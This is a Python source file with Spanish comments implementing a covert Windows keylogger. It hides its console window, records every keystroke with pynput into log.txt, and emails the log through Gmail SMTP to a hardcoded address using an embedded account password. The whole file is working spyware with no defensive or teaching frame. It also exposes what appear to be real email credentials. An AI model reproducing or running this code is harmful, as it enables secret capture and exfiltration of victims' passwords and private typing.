import win32console
import win32gui 
import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Para que este en segundo plano o no se vea#
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

#Abrir el archivo y sino existe lo crea#


def enviar_datos():
    msg = MIMEMultipart()
    password = "iqajahsnotdjqnpa" #Contraseña del correo#
    msg['From'] = "hilary.obregon.16@gmail.com" #Aca es desde donde se va enviar la informacion (debe ser un correo)#
    msg['To'] = "hilary.obregon.16@gmail.com" #Correo a donde va llegar la informacion (recomendado ser el mismo correo)#
    msg['Subject'] = "Keylogger Data" #Asunto del correo#
    msg.attach(MIMEText(open('log.txt').read())) #Abre el archivo y su info#
    #Capturar errores#
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        print("Error al enviar el correo") 


lista_teclas = []
def imprimir():
        with open("log.txt", "a") as log_file:    
            teclas = ''.join(lista_teclas)
            log_file.write(teclas)
            log_file.write("\n")
        time.sleep(5)
        enviar_datos()

def presiona(key):    
    key1 = convert(key)
    if key1 == "Key.esc": 
        print("Saliendo...")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append("\n")
    elif key1 == "Key.backspace":
        lista_teclas.pop()
    elif key1 == "Key.shift":
        pass
        #lista_teclas.append(" ")
    elif key1 == "Key.ctrl":
        pass
        #lista_teclas.append(" ")
    elif key1 == "Key.alt":
        pass
       
    else:
        lista_teclas.append(key1)
    print(lista_teclas)


def convert(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=presiona) as listener:

    listener.join()